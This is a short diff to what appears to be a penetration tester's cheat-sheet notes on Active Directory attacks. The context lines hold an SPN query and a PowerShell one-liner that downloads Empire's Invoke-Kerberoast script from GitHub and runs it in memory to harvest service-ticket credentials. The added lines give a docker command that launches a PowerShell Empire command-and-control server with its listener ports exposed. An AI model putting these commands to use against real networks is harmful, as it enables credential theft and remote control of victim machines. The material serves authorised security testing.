@@ -297,7 +297,25 @@
   -  setspn -T medin -Q ​ */* 
 - Invoke Kereberosast script:
   - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
-  
+
+```
+# Docker Empire
+
+## [isaudits/docker-empire](https://github.com/isaudits/docker-empire)
+## [hoptimumthreat/powershell-empire-docker](https://github.com/hoptimumthreat/powershell-empire-docker)
+
+
+docker run -it -p 80:80 \
+-p 443:443 -p 8080:8080 \
+-p 8081:8081 \
+-v ~/Empire/tmp:/tmp \
+-v ~/Empire/data:$(pwd)/Empire/data/downloads \
+hoptimumthreat/powershell-empire
+
+```
+
+
+
 ### Stabilize / Post Exploit / Persistance windows
 
 #### Tampering with low users
